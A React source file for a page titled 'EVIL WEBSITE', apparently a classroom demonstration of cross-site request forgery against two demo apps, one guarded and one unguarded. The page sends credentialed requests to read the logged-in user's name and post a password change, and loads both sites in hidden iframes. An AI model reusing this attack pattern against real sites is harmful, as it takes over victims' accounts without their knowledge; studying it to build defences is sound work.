/* eslint-disable jsx-a11y/iframe-has-title */
import axios from "axios";
import React, { useEffect, useState } from "react";

axios.defaults.withCredentials = true;

const App = () => {

  const [newPassword, setNewPassword] = useState("");
  const [safeUsername, setSafeUsername] = useState("");
  const [unsafeUsername, setUnsafeUsername] = useState("");
  const [message, setMessage] = useState("");

  useEffect(() => {
    const fetch = async() => {
      try { 
        const response = await axios.get("https://token-based-unsafe.herokuapp.com/users/auth");
        setUnsafeUsername(response.data.username);
        const res = await axios.get("https://token-based-unsafe.herokuapp.com/users/auth");
        setSafeUsername(res.data.username);
      }
      catch(err) {
        console.log(err);
      }
    }
    fetch();
  },[]);

  const sendToSafe = async() => {
    try {
      if(safeUsername)
      {
        const response = await axios.post("https://token-based-auth.herokuapp.com/users/change", {newPassword, username: safeUsername});
        console.log(response.data);
      }
      else {
        setMessage("PASSWORD COULD NOT BE CHANGED");
      }
    }
    catch(err) {
      setMessage("PASSWORD COULD NOT BE CHANGED");
      console.log(err);
    }
  }

  const sendToUnsafe = async() => {
    try {
      if(unsafeUsername)
      {
        const response = await axios.post("https://token-based-unsafe.herokuapp.com/users/change", {newPassword, username: unsafeUsername});
        console.log(response.data);
        if(response.data.message === "Error") {
          setMessage("PASSWORD COULD NOT BE CHANGED");
        }
        else {
          setMessage("PASSWORD CHANGED SUCCESSFULLY");
        }
      }
      else {
        setMessage("PASSWORD COULD NOT BE CHANGED");
      }
    }
    catch(err) {
      console.log(err);
    }
  }

  return (
    <div className = "text-center up">
    <h1> EVIL WEBSITE </h1>
    <div>
      <input
        type = "text"
        placeholder = "enter new password"
        onChange = {(e) => setNewPassword(e.target.value)} 
        value = {newPassword}
      />
    </div>
    <button onClick = {sendToSafe} className = "btn btn-dark mt-5"> Change Password on Safe Site </button>
    <br />
    <button onClick = {() => sendToUnsafe()} className = "btn btn-dark mt-5"> Change Password on Unsafe Site </button>
    <div className="mt-5"> {message} </div>
    <iframe src="https://token-based-auth.herokuapp.com/" style={{display: "none"}}></iframe>
    <iframe src="https://token-based-unsafe.herokuapp.com/" style={{display: "none"}}></iframe>
    </div>
  );
}
export default App;
